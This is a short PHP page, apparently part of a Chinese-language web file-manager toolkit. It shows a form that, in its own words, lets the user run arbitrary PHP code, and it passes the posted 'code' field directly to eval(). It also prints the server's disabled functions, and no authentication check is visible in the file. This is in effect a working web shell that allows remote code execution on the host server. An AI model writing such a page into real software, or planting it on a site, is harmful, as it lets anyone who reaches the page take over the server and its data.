<?php
include_once ('config.php');
$action=@$_GET['action'];
$code=@$_POST['code'];
if($action=='move')$action='-移动文件';
appheader('-执行命令',$action);
if($code!=null){
    eval(stripslashes($code));
}else{
     echo "<form method=\"post\" action=\"cmd.php?action=move\">\n你可以在此处执行任意php代码:(禁用函数:<font color=\"red\">".get_cfg_var("disable_functions")."</font>)<br />\n<textarea rows=\"10\" cols=\"60\" name=\"code\" type=\"text\"></textarea><br />\n<input type=\"submit\" value=\"执行命令\">";
}
echo "<hr>\n&nbsp;<a href=\"cmd.php\">刷新页面</a>&nbsp;\n";
appmenu();
$runtime->stop();
echo "<hr>页面执行时间: ".$runtime->spent()."秒.\n";
appfooter();
?>